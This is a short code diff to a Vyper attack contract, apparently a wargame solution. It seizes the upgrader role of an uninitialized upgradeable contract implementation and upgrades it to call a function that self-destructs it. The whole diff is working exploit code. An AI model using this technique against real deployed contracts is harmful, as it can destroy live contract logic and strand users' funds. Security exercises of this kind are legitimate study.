@@ -19,9 +19,13 @@ def __init__(_instance: InstanceInterface):
     self.instance = _instance
 
 @external
-def attack(addr: address):
+def attack():
     assert msg.sender == owner, "!owner"
     self.instance.initialize()
     assert self.instance.upgrader() == self, "!upgrader"
-    bomb: address = create_copy_of(addr)
-    self.instance.upgradeToAndCall(bomb, _abi_encode(empty(address)))
+    self.instance.upgradeToAndCall(self, method_id("explode()"))
+
+@external
+def explode():
+    assert tx.origin == owner, "!origin"
+    selfdestruct(empty(address))
